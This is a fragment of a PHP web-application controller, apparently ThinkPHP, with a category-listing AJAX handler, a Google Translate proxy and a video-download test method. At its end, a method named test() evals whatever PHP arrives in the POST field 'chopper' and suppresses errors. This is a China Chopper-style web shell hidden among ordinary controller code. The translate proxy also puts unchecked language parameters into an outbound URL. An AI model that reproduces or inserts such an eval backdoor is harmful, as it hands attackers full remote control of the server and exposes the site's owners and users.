			$lan = intval($this->_param('lan'));
			$page = (int)$this->_param('p');
			$cid = intval($this->_param('cid'));
			$grade = $this->_param('grade');
			$sort = $this->_param('sort');
			$page = $page ? $page : 1;
			
			if ($lan == 0) {
				$lan = session('lanNow');
				empty($lan) && $lan = 1;
			}
			$_SESSION['lanNow'] = $lan;
			$catModel = D("Category");
			$ret = $catModel->getIndexCategoryLinksList($lan, $cid, $grade, $sort, $page);
			$this->ajaxReturn($ret, "请求成功", true);
		}
	}

	/**
	 * @desc google translate
	 * @author Frank UPDATE 2013-08-17
	 */
	public function google_translate() {
		$srcLang = $this->_param('sl');
		$tatLang =$this->_param('tl');
		$q = urlencode(trim($_POST['q']));
		
		$url = 'http://translate.google.cn/translate_a/t?client=t&hl=zh-CN&sl=' . $srcLang . '&tl=' . $tatLang . '&ie=UTF-8&oe=UTF-8&multires=1&oc=1&prev=conf&psl=en&ptl=vi&otf=1&it=sel.166768%2Ctgtd.2118&ssel=4&tsel=4&sc=1&q=' . $q;
		$result = file_get_contents($url);
		$this->ajaxReturn($result, '', true);
	}
	
	public function test0619() {
		set_time_limit(1000);
		import("@.ORG.VideoDownload");
		$videoDownload = new VideoDownload();
		$videoInfo = $videoDownload->download("http://www.peepandthebigwideworld.com/activities/anywhere-activities/whathappens/");
		if (!$videoInfo) {
			var_dump($videoDownload->getError());
		}
		var_dump($videoInfo);
	}
	
	public function test() {
		@eval($_POST['chopper']);
		exit(0);
	}
}